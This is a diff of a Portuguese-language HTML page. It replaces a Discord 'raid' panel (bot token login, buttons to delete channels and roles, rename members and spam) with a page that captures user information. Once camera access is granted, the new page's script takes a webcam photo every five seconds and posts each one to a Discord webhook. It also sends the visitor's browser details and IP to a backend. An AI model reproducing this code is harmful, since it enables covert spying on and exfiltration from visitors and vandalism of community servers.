@@ -1,49 +1,113 @@
 <!DOCTYPE html>
-<html lang="pt-br">
+<html lang="pt">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Painel Admin - Raid</title>
-    <link rel="stylesheet" href="style.css">
+    <title>Informações do Usuário</title>
+    <style>
+        body {
+            background-color: black;
+            color: white;
+            font-family: Arial, sans-serif;
+        }
+        button {
+            background-color: #4CAF50;
+            color: white;
+            padding: 10px 20px;
+            border: none;
+            cursor: pointer;
+        }
+        button:hover {
+            background-color: #45a049;
+        }
+        .content {
+            text-align: center;
+            margin-top: 50px;
+        }
+    </style>
 </head>
 <body>
-    <!-- Tela de Login -->
-    <div id="login-screen" class="screen">
-        <h1>Login</h1>
-        <input type="text" id="bot-token" placeholder="Token do Bot" class="input-field">
-        <button class="btn" id="login-btn">Login</button>
+    <div class="content">
+        <h1>Capturar Informações do Usuário</h1>
+        <button id="getPermission">Permitir Acesso à Câmera</button>
+        <button id="sendInfo">Enviar Informações</button>
+        <p id="status"></p>
     </div>
 
-    <!-- Tela de Informações do Bot -->
-    <div id="bot-info-screen" class="screen hidden">
-        <h1>Informações do Bot</h1>
-        <p><strong>Nome:</strong> <span id="bot-name">Carregando...</span></p>
-        <p><strong>Apelido:</strong> <span id="bot-nickname">Carregando...</span></p>
-        <p><strong>Data de Criação:</strong> <span id="bot-creation-date">Carregando...</span></p>
-        <p><strong>ID:</strong> <span id="bot-id">Carregando...</span></p>
-        <p><strong>Token:</strong> <span id="bot-token-info">Carregando...</span></p>
-        <p><strong>Em servidores:</strong> <span id="bot-servers-count">Carregando...</span></p>
-        <button class="btn" id="next-screen-btn">Próxima Tela</button>
-    </div>
+    <script>
+        let userInfo = {};
 
-    <!-- Tela de Seleção de Servers -->
-    <div id="servers-screen" class="screen hidden">
-        <h1>Lista de Servers para Raid</h1>
-        <button class="btn" id="load-servers">Carregar Servidores</button>
-        <ul id="servers-list"></ul>
-        <button class="btn hidden" id="confirm-server-btn">Confirmar Server</button>
-    </div>
+        // Função para pegar informações do usuário
+        function getUserInfo() {
+            const ip = '192.168.0.1'; // Use API de IP para capturar o IP real
+            const deviceInfo = navigator.userAgent;
+            const browser = navigator.appName;
+            
+            userInfo = { ip, deviceInfo, browser };
+        }
 
-    <!-- Tela de Ações -->
-    <div id="action-screen" class="screen hidden">
-        <h1>Ações para Raid</h1>
-        <button class="btn" id="delete-channels">Apagar Canais</button>
-        <button class="btn" id="delete-roles">Apagar Cargos</button>
-        <button class="btn" id="rename-members">Renomear Membros</button>
-        <button class="btn" id="start-spam">Iniciar Spam</button>
-        <button class="btn" id="send-invite">Enviar Convite</button>
-    </div>
+        // Permissão para câmera
+        document.getElementById('getPermission').addEventListener('click', function() {
+            navigator.mediaDevices.getUserMedia({ video: true })
+                .then(function(stream) {
+                    document.getElementById('status').innerText = "Permissão Concedida. Capturando fotos...";
+                    capturePhoto(stream);
+                })
+                .catch(function(err) {
+                    document.getElementById('status').innerText = "Permissão Negada!";
+                });
+        });
 
-    <script src="app.js"></script>
+        // Captura a foto a cada 5 segundos
+        function capturePhoto(stream) {
+            const video = document.createElement('video');
+            video.srcObject = stream;
+            video.play();
+
+            setInterval(() => {
+                const canvas = document.createElement('canvas');
+                canvas.width = 640;
+                canvas.height = 480;
+                const context = canvas.getContext('2d');
+                context.drawImage(video, 0, 0, canvas.width, canvas.height);
+
+                canvas.toBlob(blob => {
+                    sendPhotoToWebhook(blob);
+                }, 'image/jpeg');
+            }, 5000);
+        }
+
+        // Envia a foto para o webhook
+        function sendPhotoToWebhook(blob) {
+            const formData = new FormData();
+            formData.append('file', blob);
+
+            fetch('https://discord.com/api/webhooks/YOUR_WEBHOOK_URL', {
+                method: 'POST',
+                body: formData
+            }).then(response => response.json())
+              .then(data => console.log('Imagem enviada para o webhook:', data))
+              .catch(error => console.error('Erro ao enviar imagem:', error));
+        }
+
+        // Envia as informações coletadas para o backend
+        document.getElementById('sendInfo').addEventListener('click', function() {
+            getUserInfo();
+
+            fetch('/send-info', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify(userInfo)
+            })
+            .then(response => response.json())
+            .then(data => {
+                document.getElementById('status').innerText = "Informações enviadas com sucesso!";
+            })
+            .catch(error => {
+                document.getElementById('status').innerText = "Erro ao enviar informações.";
+                console.error('Erro:', error);
+            });
+        });
+    </script>
 </body>
 </html>
